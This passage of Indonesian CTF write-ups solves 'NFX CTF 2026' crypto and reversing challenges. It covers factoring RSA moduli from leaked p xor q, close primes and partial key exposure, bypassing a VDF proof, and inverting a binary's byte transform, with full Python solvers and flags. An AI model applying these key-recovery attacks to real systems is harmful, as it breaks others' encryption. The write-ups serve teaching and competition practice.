    read_until(b"Tag: ")
    s.sendall(tag.to_bytes(16, "big").hex().encode() + b"\n")
    out = read_until(b"> ")
    print(out.decode(errors="replace"))


if __name__ == "__main__":
    main()
````


<a id="p1-unbreakable-delay"></a>
# NFX CTF 2026 - Unbreakable Delay

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{x0r_f4ct0r1ng_4nd_f4st_vdf_byp4ss_m4k3s_1t_h4rd}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Kad

Implementasi *Fiat-Shamir* pada VDF (Verifiable Delay Function) telah diperbaiki! Sekarang kamu **WAJIB** memberikan bukti ($\pi$) yang valid untuk operasi eksponensial $2^{256}$. Sayangnya, komputasi ini secara normal membutuhkan waktu triliunan tahun. Sanggupkah kamu mem-bypass penundaan ini?

![gambar](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREylHPYMhoe-0fZYeX6u18PIZto-8z7wBOOMrmpvgngg&s=10)


> Format: NFX{your_flag_here}

**Lampiran:**

- tidak ada

**Service / Target:**

- `{"name":"NFX/UnbreakableDelay","key":"NFXCTF-NFCC-NXCTF-2026"}`

Cek port terkini SEBELUM eksploit (jangan hardcode):
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K"
curl -s "$B?action=inspect&name=<nama>" -H "$K"
curl -s -X POST "$B" -H "$K" -H "Content-Type: application/json" \
  -d '{"action":"extend","name":"<nama>"}' # TTL <=900 dtk
```

**Berkas di workspace:** `solve.py`

---

### 2. TL;DR (Ringkasan Singkat)

Service TCP mencetak modulus N 2048-bit, hint p xor q sekitar 1020 bit, nilai X = g^(2^(2^256)), challenge r, lalu meminta proof pi dengan skema Wesolowski. Dari bentuk data itu ada dua jalur yang harus dipahami. Flag: `NFX{x0r_f4ct0r1ng_4nd_f4st_vdf_byp4ss_m4k3s_1t_h4rd}`.

**Pemahaman inti:** Soal terlihat seperti harus menunggu VDF, padahal kuncinya adalah faktorisasi N dari bocoran `p xor q`. Setelah phi diketahui, eksponen raksasa cukup direduksi modulo lambda.

---

### 3. Analisis Awal (Recon / Discovery)

Service TCP mencetak modulus `N` 2048-bit, hint `p xor q` sekitar 1020 bit, nilai `X = g^(2^(2^256))`, challenge `r`, lalu meminta proof pi dengan skema Wesolowski. Dari bentuk data itu ada dua jalur yang harus dipahami. Pertama, `p xor q` membocorkan setiap bit yang berbeda antara p dan q, sehingga faktorisasi bisa dilakukan bit-demi-bit dari LSB ke MSB dengan pruning `(p_low * q_low) mod 2^(i+1) == N mod 2^(i+1)`. Kedua, protokol VDF-nya hanya meminta proof, bukan hasil komputasi jujur: kalau faktorisasi N diketahui, maka lambda(N) diketahui, dan eksponen `2^(2^256)` bisa direduksi modulo lambda untuk menghitung `X` dan `pi` secara langsung. Jadi beban soal ada di faktorisasi, bukan di komputasi VDF.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. Service TCP `s1.nfx.my.id:40734` (NFX/UnbreakableDelay, nxctl) mencetak:
   `modulus N` (2048 bit), `hint (p ^ q)` (≈1020 bit), `X = g^(2^(2^256))`,
   `challenge r`, lalu minta proof π (skema Wesolowski).
2. **Faktorisasi N dari p^q**: DFS bit-demi-bit (LSB→MSB): pilih bit p,q dengan
   `p_i^q_i=x_i`, prune `(p_low·q_low) mod 2^(i+1) == N mod 2^(i+1)`
   (`sys.setrecursionlimit(20000)`, 1100 bit). → p,q 1024 bit, `p*q=N`
3. Dengan φ (atau λ) diketahui, VDF tak perlu dihitung: eksponen raksasa
   `E = 2^(2^256)` direduksi `mod λ` → `X = g^E mod N`. Identifikasi g dengan
   mencoba g=2..199 → **g=3** (cocok dengan X).
4. Proof: `rem = E mod r = pow(2,2**256,r)`, `A = pow(2,2**256,r·λ)`,
   `q_exp = ((A−rem)//r) mod λ`, `π = 3^q_exp mod N`.
   Self-check lokal: `π^r · g^rem ≡ X (mod N)`
5. Kirim π → service: `proof success! here's your flag:`
6. **Flag**: `NFX{x0r_f4ct0r1ng_4nd_f4st_vdf_byp4ss_m4k3s_1t_h4rd}`

---

### 5. Flag & Verifikasi

**Flag:** `NFX{x0r_f4ct0r1ng_4nd_f4st_vdf_byp4ss_m4k3s_1t_h4rd}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`challenges/crypto/unbreakable-delay/solve.py`**

````python
#!/usr/bin/env python3
"""Unbreakable Delay - bypass VDF Wesolowski dengan memfaktorkan N dari hint (p XOR q).

Protokol (dari service):
  modulus N, hint p^q, nilai X = g^(2^(2^256)), challenge r -> minta proof pi.

Ide: p^q diketahui -> faktorkan N (DFS bitwise). Dengan phi(N) diketahui,
eksponen raksasa E = 2^(2^256) bisa direduksi mod phi. Proof Wesolowski:
  pi = g^(floor(E/r)) -> floor(E/r) mod phi dihitung via
  A = 2^(2^256) mod (r*phi) (A ≡ E mod r), q = ((A - (E mod r)) // r) mod phi.
g tidak dicetak -> cari g kecil yang memenuhi X = g^E mod N.
"""
import socket
import re
import sys
sys.setrecursionlimit(20000)

HOST, PORT = "s1.nfx.my.id", 40734


def recv_until(s, marker, timeout=15):
    s.settimeout(timeout)
    data = b""
    while marker not in data:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        data += c
    return data


def factor_from_xor(n, x, bits=1100):
    """DFS bitwise: p*q = n, p XOR q = x. Pruning: (p_low*q_low) mod 2^(i+1) == n mod 2^(i+1)."""
    solutions = []

    def dfs(i, p, q):
        if len(solutions) > 1:
            return
        if i >= bits:
            if p > 1 and q > 1 and p * q == n:
                solutions.append((p, q))
            return
        xi = (x >> i) & 1
        cands = [(0, 0), (1, 1)] if xi == 0 else [(0, 1), (1, 0)]
        mask = (1 << (i + 1)) - 1
        target_low = n & mask
        for pi, qi in cands:
            np_ = p | (pi << i)
            nq_ = q | (qi << i)
            if (np_ * nq_) & mask != target_low:
                continue
            dfs(i + 1, np_, nq_)

    dfs(0, 0, 0)
    return solutions


def main():
    s = socket.create_connection((HOST, PORT), timeout=15)
    banner = recv_until(s, b"Give me the proof")
    text = banner.decode(errors="replace")
    print("=== banner ===")
    print("banner_len",len(text)); print(text)
    n = int(re.search(r"modulus is (\d+)", text).group(1))
    x = int(re.search(r"hint \(p \^ q\) is (\d+)", text).group(1))
    target = int(re.search(r"== (\d+)", text).group(1))
    r = int(re.search(r"my challenge is (\d+)", text).group(1))
    print("N bits", n.bit_length(), "XOR bits", x.bit_length(), "r", r)

    sols = factor_from_xor(n, x)
    if not sols:
        print("GAGAL faktorisasi")
        return
    p, q = sols[0]
    assert p * q == n
    print("faktor ketemu:", p.bit_length(), q.bit_length(), "bit")

    lam = (p - 1) * (q - 1) // __import__("math").gcd(p - 1, q - 1)
    # E = 2^(2^256)
    E_mod_lam = pow(2, 2 ** 256, lam)
    g = None
    for cand in range(2, 200):
        if pow(cand, E_mod_lam, n) == target:
            g = cand
            break
    if g is None:
        print("g tidak ketemu di 2..199")
        return
    print("g =", g)

    E_mod_r = pow(2, 2 ** 256, r)
    A = pow(2, 2 ** 256, r * lam)
    assert A % r == E_mod_r
    q_exp = ((A - E_mod_r) // r) % lam
    pi = pow(g, q_exp, n)
    # self-check: pi^r * g^(E mod r) == target
    assert pow(pi, r, n) * pow(g, E_mod_r, n) % n == target % n, "proof check gagal"
    print("proof valid (lokal), kirim...", flush=True)
    s.sendall(str(pi).encode() + b"\n")
    resp = recv_until(s, b"\n", timeout=10)
    print("=== response ===")
    print(resp.decode(errors="replace")[:2000])
    try:
        print("RAW:", s.recv(4096).decode(errors="replace")[:2000])
    except Exception:
        pass


if __name__ == "__main__":
    main()
````


<a id="p1-broken-signature-scheme"></a>
# NFX CTF 2026 - Broken Signature Scheme

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Hard
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NXCTF{mult1_l4y3r_l4tt1c3_r54_s1gn4tur3_hnp_8c211ad6b5a6}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: rio

Tantangan kriptografi berlapis tiga. Dimulai dari skema signature RSA yang lemah, dilanjutkan dengan RSA modulus yang faktornya berdekatan dan partial key exposure, lalu ciphertext flag yang dienkripsi menggunakan AES-GCM.

Dapatkah kamu menembus ketiga layer tersebut?

> Format: NXCTF{...}

**Lampiran:**

- `challenge.py` → `crypto/broken-signature-scheme/challenge.py` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Broken_Signature_Scheme_Multi_Layer/challenge.py
- `output.txt` → `crypto/broken-signature-scheme/output.txt` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Broken_Signature_Scheme_Multi_Layer/output.txt

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `challenge.py` · `output.txt`

---

### 2. TL;DR (Ringkasan Singkat)

Skema signature-nya adalah RSA mentah sig(m) = m^d mod N tanpa hash, sehingga secara teori rentan terhadap pemalsuan multiplikatif. Namun pembangkit kunci justru memberi celah yang lebih langsung: q = nextprime(p + 2^300), jadi selisih p dan q hanya sekitar 2^300 pada N 2048-bit. Flag: `NXCTF{mult1_l4y3r_l4tt1c3_r54_s1gn4tur3_hnp_8c211ad6b5a6}`.

**Pemahaman inti:** Kunci RSA-nya lemah: `q = nextprime(p + 2^300)` membuat p dan q berdekatan. Jalur tercepat bukan menyerang sifat multiplikatif signature, tetapi menyelesaikan persamaan kuadratik untuk memfaktorisasi N.

---

### 3. Analisis Awal (Recon / Discovery)

Skema signature-nya adalah RSA mentah `sig(m) = m^d mod N` tanpa hash, sehingga secara teori rentan terhadap pemalsuan multiplikatif. Namun pembangkit kunci justru memberi celah yang lebih langsung: `q = nextprime(p + 2^300)`, jadi selisih p dan q hanya sekitar `2^300` pada N 2048-bit. Dengan `N = p(p + 2^300 + delta)`, persamaan kuadratik `p^2 + (2^300 + delta)p - N = 0` bisa diselesaikan untuk delta kecil, dan `isqrt((2^300+delta)^2 + 4N)` harus kuadrat sempurna. Ada juga cross-check `(p >> 500) & 0xfffff` yang harus sama dengan nilai `leak`. Pemahaman ini membuat serangan multiplikatif tidak perlu: faktorisasi langsung memberi `d`, dan kunci AES-GCM diturunkan dari `SHA256(p || q)` dengan urutan yang harus benar.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. Skema: `sig(m)=m^d mod N` (tanpa hash) - multiplicative, tapi kunci utama:
   `q = nextprime(p + 2^300)` → **p dan q sangat dekat** (beda ≈ 2^300 pada N 2048-bit).
2. Trik kuadratik (tanpa Coppersmith): `N = p*(p + 2^300 + δ)` → selesaikan
   `p² + (2^300+δ)p − N = 0`. Scan δ=0..20000, cek `isqrt((B)²+4N)` eksak
   (`B=2^300+δ`) dan `N % p == 0`.
   Hasil: **δ=2104**, p 1024-bit, q 1024-bit.
3. Cross-check kebocoran: `(p>>500)&0xfffff = 0x69252` = `leak`
4. `d = e⁻¹ mod φ(N)`; verifikasi `pow(sig,e,N)==msg` utk target `give-me-the-flag`
   (jadi layer-1 "produk signature" tidak perlu - faktorisasi langsung menang).
5. Flag AES-GCM: `key = SHA256(p.to_bytes(128,'big') || q.to_bytes(128,'big'))`
   (urutan p||q; q||p gagal MAC). Decrypt `flag_cipher`:
   `NXCTF{mult1_l4y3r_l4tt1c3_r54_s1gn4tur3_hnp_8c211ad6b5a6}`
6. **Flag**: `NXCTF{mult1_l4y3r_l4tt1c3_r54_s1gn4tur3_hnp_8c211ad6b5a6}` (tag GCM verified)

---

### 5. Flag & Verifikasi

**Flag:** `NXCTF{mult1_l4y3r_l4tt1c3_r54_s1gn4tur3_hnp_8c211ad6b5a6}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p1-rsa-coppersmith-cihuy"></a>
# NFX CTF 2026 - RSA Coppersmith cihuy

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFXCTF{C0pp3rsm1th_p4rt14l_k3y_3xp0sur3_9617eda9}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Illal

Server logistik ini ngenkripsi master flag-nya, terus pas lagi audit rutin... *plot twist!* Ada dump memori yang bocor

Bocornya emang nggak lengkap sih, cuma sebagian doang. Tapi pertanyaannya: segitu doang... emang cukup ya buat ngebuka flag-nya?

Semua datanya udah ada di file yang dikasih. Ganbatte ya, jangan nyerah di tengah jalan kayak anime yang ending-nya gantung~

![gambar](https://media1.tenor.com/m/aZ4Zx5HcF8YAAAAd/happy-november.gif)

**Lampiran:**

- `chall.py` → `crypto/rsa-coppersmith-cihuy/chall.py` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/RSA_Coppersmith_cihuy/chall.py

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `chall.py` · `solve.py`

---

### 2. TL;DR (Ringkasan Singkat)

chall.py memberi n 1024-bit, e=65537, ciphertext c, bocoran p_msb berisi 300 bit teratas p, dan unknown_bits=212. Artinya p = p_msb << 212 + x dengan x < 2^212. Flag: `NFXCTF{C0pp3rsm1th_p4rt14l_k3y_3xp0sur3_9617eda9}`.

**Pemahaman inti:** Batas Coppersmith masih terpenuhi karena `N^0.25` sekitar 2^256 lebih besar dari 2^212. Tanpa Sage, lattice Howgrave-Graham dibangun manual dan dijalankan dengan fpylll.

---

### 3. Analisis Awal (Recon / Discovery)

`chall.py` memberi `n` 1024-bit, `e=65537`, ciphertext `c`, bocoran `p_msb` berisi 300 bit teratas p, dan `unknown_bits=212`. Artinya `p = p_msb << 212 + x` dengan `x < 2^212`. Sebelum memilih alat, batas serangan dihitung: untuk Coppersmith univariate dengan beta 0.5 dan delta 1, ambangnya `N^(beta^2/delta) = N^0.25`, sekitar `2^256`, dan nilai itu masih jauh di atas `2^212`, jadi akar kecil `x` bisa dipulihkan. Masalah praktisnya, Sage tidak tersedia di lingkungan ini, sehingga konstruksi lattice Howgrave-Graham harus ditulis sendiri: polinomial `g_i(x) = N^(m-i) f(x)^i` untuk `i < m` dan `g_{m+i}(x) = x^i f(x)^m` untuk `i < t`, dengan `f(x) = x + A`, `m = t = 6`, dan skala `x -> X*x`. Setelah LLL, akar ditemukan lewat GCD polinomial dari dua vektor terpendek.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. `chall.py`: n 1024-bit, e=65537, c, `p_msb` 300 bit teratas p, `unknown_bits=212`.
   Jadi `p = p_msb<<212 + x`, `x < 2^212`.
2. Batas Coppersmith univariate (β=0.5, δ=1): `N^(β²/δ) = N^0.25 ≈ 2^256 > 2^212`
   → bisa dipecahkan dengan lattice.
3. Tanpa Sage → implementasi Howgrave-Graham sendiri + **fpylll** (`solve.py`):
   polinomial `g_i(x)=N^(m-i)·f(x)^i` (i<m), `g_{m+i}(x)=x^i·f(x)^m` (i<t),
   f(x)=x+A, A=p_msb<<212, m=t=6 (dimensi 12), skala x→X·x (X=2^212).
   LLL → dua vektor terpendek → **gcd polinomial** → akar linear `x0`.
4. `x0` ketemu → `p = A + x0` membagi n → q, `d=e⁻¹ mod φ`, `m=c^d mod n`:
   `NFXCTF{C0pp3rsm1th_p4rt14l_k3y_3xp0sur3_9617eda9}`
5. Catatan: fpylll butuh `pip install cysignals fpylll` (di luar repo).

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{C0pp3rsm1th_p4rt14l_k3y_3xp0sur3_9617eda9}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`challenges/crypto/rsa-coppersmith-cihuy/solve.py`**

````python
#!/usr/bin/env python3
"""RSA Coppersmith cihuy - univariate Coppersmith (Howgrave-Graham) tanpa Sage.

n 1024-bit; p = p_msb<<212 + x, x < 2^212 (212 bit tak diketahui) -> di bawah
batas N^(beta^2/delta) = 2^256 utk beta=0.5, delta=1.
Lattice: g_i(x) = N^(m-i) f(x)^i (i<m), g_{m+i}(x)= x^i f(x)^m (i<t), f(x)=x+A.
Setelah LLL: polinomial pendek punya x0 sebagai akar bulat murni (Howgrave-Graham).
Akar dicari via gcd polinomial dua vektor LLL.
"""
from fractions import Fraction
from fpylll import IntegerMatrix, LLL

n = 0xE4ABA2D625FEC44D3984056BED4ED632B178E6F5B3893593E736111E9E91A7130F957FD76C48D42724C3423F6D6D8132EF909A8E414E24F6ACE3BA2C0A8059C29BCE292055A9BF9B7008E0788162B568691E85F52C24A9D904DDFFC6EF5DCB177D12243CFE449AB3638E52491247455C1DF12030975D469A933685CF0527421B
e = 65537
c = 0xC5DD7E48FF77FBC1D1AD1130550CDE5FDEC27CDF2D8A890370DEFA7605538EA82945462297449AB9D0F8C01D0FF403283F0B4DA677389289F0D923FE6E24DD6B3AFA02F22534754C0261C87EC7C0E488DC2A764DD327A1EA211AD1025EB231B7E856F4F66333A9FFC3A16189C47E4DE39D55C9ED474AEEAF4F22B997EC706174
p_msb = 0xF13228781AB150BC402DF686354483D5FA1B226BB33DD3AD9E4D3011AC92AD2F2589B571CA3
SHIFT = 212


def poly_mul(a, b):
    r = [0] * (len(a) + len(b) - 1)
    for i, x in enumerate(a):
        for j, y in enumerate(b):
            r[i + j] += x * y
    return r


def poly_pow(a, k):
    r = [1]
    for _ in range(k):
        r = poly_mul(r, a)
    return r


def poly_gcd(a, b):
    """GCD dua polinomial integer (monic atas Q), koefisien Fraction."""
    a = [Fraction(x) for x in a]
    b = [Fraction(x) for x in b]
    while any(b):
        while b and b[-1] == 0:
            b.pop()
        if not b:
            break
        a, b = b, poly_mod(a, b)
    while a and a[-1] == 0:
        a.pop()
    if not a:
        return []
    lead = a[-1]
    return [x / lead for x in a]


def poly_mod(a, b):
    a = [Fraction(x) for x in a]
    b = [Fraction(x) for x in b]
    while b and b[-1] == 0:
        b.pop()
    db = len(b) - 1
    while len(a) - 1 >= db and any(a):
        while a and a[-1] == 0:
            a.pop()
        if len(a) - 1 < db:
            break
        coef = a[-1] / b[-1]
        shift = len(a) - 1 - db
        for i in range(len(b)):
            a[i + shift] -= coef * b[i]
        a.pop()
    return a


def main():
    A = p_msb << SHIFT
    X = 1 << SHIFT
    beta = 0.5
    m, t = 6, 6
    f = [A, 1] # f(x) = A + x (monic deg 1)
    polys = []
    for i in range(m):
        p_ = poly_pow(f, i)
        p_ = [coef * (n ** (m - i)) for coef in p_]
        polys.append(p_)
    fm = poly_pow(f, m)
    for i in range(t):
        p_ = [0] * i + fm
        polys.append(p_)
    D = m + t
    M = IntegerMatrix(D, D)
    for i, p_ in enumerate(polys):
        for j, coef in enumerate(p_):
            M[i, j] = coef * (X ** j)
    LLL.reduction(M)
    rows = [[int(M[i, j]) for j in range(D)] for i in range(min(6, D))]

    def to_poly(row):
        return [row[j] // (X ** j) for j in range(D)]

    cands = set()
    for i in range(len(rows)):
        for j in range(i + 1, len(rows)):
            g = poly_gcd(to_poly(rows[i]), to_poly(rows[j]))
            if len(g) == 2: # linear: c1*x + c0
                x0 = -g[0] / g[1]
                if x0.denominator == 1:
                    cands.add(int(x0))
    print("kandidat akar:", [hex(x) for x in list(cands)[:5]])
    for x0 in cands:
        p = A + x0
        if p > 0 and n % p == 0:
            q = n // p
            print("FAKTOR ketemu! p bits", p.bit_length(), "q bits", q.bit_length())
            d = pow(e, -1, (p - 1) * (q - 1))
            mval = pow(c, d, n)
            pt = mval.to_bytes((mval.bit_length() + 7) // 8, "big")
            print("plaintext:", pt)
            try:
                print("flag:", pt.decode())
            except Exception:
                pass
            return
    print("gagal - coba parameter lain")


if __name__ == "__main__":
    main()
````


<a id="p1-static-iv-offline"></a>
# NFX CTF 2026 - Static IV Offline

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NXCTF{cbc_1v_r3u53_l34k5_k3y5tr34m_b0fbd4d35f80}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: rio

`challenge.py` memperlihatkan bagaimana flag dienkripsi secara offline menggunakan AES-256-CBC. IV yang dipakai statis, sedangkan key diturunkan dari `SHA256(MASTER || counter)`. Nilai `MASTER` tersedia di `challenge.py`, sementara `counter` dan ciphertext ada di `output.txt`.

Dapatkah kamu memulihkan flag dari ciphertext tersebut?

**Lampiran:**

- `challenge.py` → `crypto/static-iv-offline/output.txt` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Static_IV_Offline/challenge.py
- `output.txt` → `crypto/static-iv-offline/challenge.py` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Static_IV_Offline/output.txt

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `challenge.py` · `output.txt`

---

### 2. TL;DR (Ringkasan Singkat)

challenge.py memperlihatkan skema enkripsi: key = SHA256(MASTER + counter.to_bytes(4, 'little'))[:32], lalu AES-256-CBC dengan IV statis. Nilai MASTER = b'\x13\x37' * 16 ditulis terbuka di file, sedangkan output.txt memberi counter=11, IV aa sebanyak 16 byte, dan ciphertext dalam hex. Flag: `NXCTF{cbc_1v_r3u53_l34k5_k3y5tr34m_b0fbd4d35f80}`.

**Pemahaman inti:** Tidak ada yang perlu dipecahkan secara kriptografis: MASTER bocor, counter diketahui, dan IV statis hanya tema. Rekonstruksi key lalu dekripsi langsung.

---

### 3. Analisis Awal (Recon / Discovery)

`challenge.py` memperlihatkan skema enkripsi: `key = SHA256(MASTER + counter.to_bytes(4, 'little'))[:32]`, lalu AES-256-CBC dengan IV statis. Nilai `MASTER = b'\x13\x37' * 16` ditulis terbuka di file, sedangkan `output.txt` memberi `counter=11`, IV `aa` sebanyak 16 byte, dan ciphertext dalam hex. Memahami alurnya cukup untuk menyimpulkan bahwa seluruh bahan kunci tersedia: tidak ada unknown selain plaintext. Jadi langkah penyelesaiannya adalah rekonstruksi key dari counter, dekripsi CBC, lalu unpad dan buang prefix `user-input-goes-here:|` sesuai skema soal.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. `challenge.py` membocorkan `MASTER = b"\x13\x37"*16` dan menunjukkan
   `key = SHA256(MASTER + counter.to_bytes(4,"little"))[:32]`, AES-CBC.
2. `output.txt`: counter=11, iv=`aa`*16 (statis), ct hex.
3. Dekripsi: `key=SHA256(MASTER+b'\x0b\x00\x00\x00')`, AES-CBC decrypt → unpad:
   `user-input-goes-here:|NXCTF{cbc_1v_r3u53_l34k5_k3y5tr34m_b0fbd4d35f80}`
4. **Flag**: `NXCTF{cbc_1v_r3u53_l34k5_k3y5tr34m_b0fbd4d35f80}` (prefix PREFIX+| dibuang, sesuai skema)

---

### 5. Flag & Verifikasi

**Flag:** `NXCTF{cbc_1v_r3u53_l34k5_k3y5tr34m_b0fbd4d35f80}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p1-castaway"></a>
# NFX CTF 2026 - Castaway

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Hard
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{c4st4w4y_0n_4n_0p4qu3_st4t3_m4ch1n3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Kesatria Baja Ringan

Diberikan sebuah binary mandiri yang membaca calon flag dari stdin. Program memvalidasi input
melalui state machine kecil dengan opaque predicate, transformasi per-byte yang melibatkan state,
S-box, dan key, serta pengecekan anti-debug menggunakan `ptrace`. Analisis program dan temukan
input yang tepat agar lolos validasi internalnya.

> Format: NFX{...}

**Lampiran:**

- `castaway` → `rev/castaway/castaway` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Hard_03_Castaway/castaway

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `castaway` · `solve.py`

---

### 2. TL;DR (Ringkasan Singkat)

Binary mandiri membaca calon flag dari stdin, lalu memvalidasinya dengan state machine kecil. Dari disassembly terlihat tiga bagian penting: main@0x142d memasang ptrace(TRACEME) sebagai anti-debug, transform@0x1282 memproses tiap byte dengan rantai in[i]^s, rol8 sebesar (i%7)+1, tambah tab[i&15], substitusi sbox, XOR (i*0x2f)&0xff, lalu memperbarui state s = (s*(-125) + out[i] + i) & 0xff, dan target 40 byte ada di 0x2140. Flag: `NFX{c4st4w4y_0n_4n_0p4qu3_st4t3_m4ch1n3}`.

**Pemahaman inti:** Transformasi per-byte deterministik dan state-nya hanya bergantung pada output sebelumnya, jadi seluruh rantai bisa diinversi. Anti-debug ptrace hanya mengubah byte pertama, bukan menghalangi analisis.

---

### 3. Analisis Awal (Recon / Discovery)

Binary mandiri membaca calon flag dari stdin, lalu memvalidasinya dengan state machine kecil. Dari disassembly terlihat tiga bagian penting: `main@0x142d` memasang `ptrace(TRACEME)` sebagai anti-debug, `transform@0x1282` memproses tiap byte dengan rantai `in[i]^s`, `rol8` sebesar `(i%7)+1`, tambah `tab[i&15]`, substitusi `sbox`, XOR `(i*0x2f)&0xff`, lalu memperbarui state `s = (s*(-125) + out[i] + i) & 0xff`, dan target 40 byte ada di `0x2140`. Ada juga opaque predicate yang mengecek `(i*i)&3 == 2`, kondisi yang mustahil karena kuadrat modulo 4 hanya 0 atau 1, sehingga jalur `out[0]=0xff` tidak pernah dieksekusi. Pemahaman kuncinya: state hanya bergantung pada output byte sebelumnya, sehingga inversi bisa dilakukan dari awal tanpa menebak.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. Import `ptrace` → anti-debug TRACEME di main (@0x142d): kalau sedang di-trace,
   `out[0] ^= 1` sebelum memcmp. Output oracle diambil dengan gdb tetap valid,
   cukup XOR-1 di byte 0.
2. Transform @0x1282 per byte i (state chain):
   `t = in[i]^s` → `t = rol8(t, (i%7)+1)` → `t += tab[i&15]` (@0x2120)
   → `t = sbox[t]` (@0x2020, 256 byte, permutasi) → `t ^= (i*0x2f)&0xff` → `out[i]=t`
   → `s = (s*(-125) + out[i] + i) & 0xff`, s awal 0xa5.
   Opaque predicate: state-2 cek `(i*i)&3 == 2` (mustahil, i² mod 4 ∈ {0,1}) →
   jalur `out[0]=0xff; stop` tidak pernah dieksekusi.
3. Target 40 byte @0x2140 = `d554ada8...9b74`.
4. Inversi dari awal (state hanya tergantung out[i]): sbox_inv → −tab → ror8 → ^s.
   **Gotcha**: `imul $0xffffff83` = −125 (32-bit), BUKAN −0x83 = −131 → awalnya
   state salah, flag garbage; setelah fix → plaintext valid.
5. Model diverifikasi vs oracle gdb (input 'A'*40): cocok persis semua byte
   (byte 0 ^= 1 anti-debug).
6. Flag: `NFX{c4st4w4y_0n_4n_0p4qu3_st4t3_m4ch1n3}`
7. **Verifikasi**: `printf 'NFX{...}\n' | ./castaway` → `flag> Access granted.` (tanpa debugger)

---

### 5. Flag & Verifikasi

**Flag:** `NFX{c4st4w4y_0n_4n_0p4qu3_st4t3_m4ch1n3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`challenges/rev/castaway/solve.py`**

````python
#!/usr/bin/env python3
"""Castaway - balik transform per-byte berantai (state) dari fungsi 0x1282.

Transform (untuk tiap i):
  t = sbox[ rol8(in[i] ^ s, (i%7)+1) + tab[i&0xf] ] ^ ((i*0x2f)&0xff)
  out[i] = t
  s = (s*(-0x83) + t + i) & 0xff
s awal = 0xa5.

main: ptrace(PTRACE_TRACEME) -> out[0] ^= 1 BILA sedang di-trace;
jadi jalankan normal -> al=0, out[0] tidak diubah. Lalu memcmp 40 byte
dengan target di .rodata 0x2140.

Inversi dilakukan dari awal karena state hanya bergantung pada out[i].
"""
BIN = "castaway"
SBOX_OFF = 0x2020 # 256 byte
TAB_OFF = 0x2120 # 16 byte
TARGET_OFF = 0x2140 # 40 byte target
M8 = 0xFF


def rol8(b, c):
    c &= 7
    return ((b << c) | (b >> ((-c) & 7))) & M8


def ror8(b, c):
    return rol8(b, (8 - (c & 7)) & 7)


def main():
    data = open(BIN, "rb").read()
    sbox = data[SBOX_OFF:SBOX_OFF + 256]
    tab = data[TAB_OFF:TAB_OFF + 16]
    target = data[TARGET_OFF:TARGET_OFF + 40]
    print("target:", target.hex())

    inv = [None] * 256
    for k, v in enumerate(sbox):
        inv[v] = k
    assert None not in inv, "sbox bukan permutasi"

    out = bytearray()
    s = 0xA5
    for i, ct in enumerate(target):
        rot = (i % 7) + 1
        t = ct ^ ((i * 0x2F) & M8) # buang xor indeks
        t = inv[t] # inverse sbox
        t = (t - tab[i & 0xF]) & M8 # buang add tabel
        pre = ror8(t, rot) # inverse rotate
        out.append(pre ^ s)
        s = (s * (-125) + ct + i) & M8 # state pakai out[i]; 0xffffff83 = -125 (imul 32-bit)

    flag = bytes(out).rstrip(b"\x00")
    print("flag :", flag.decode(errors="replace"))


if __name__ == "__main__":
    main()
````


<a id="p1-hard-feistel"></a>
# NFX CTF 2026 - Hard Feistel

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Hard
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
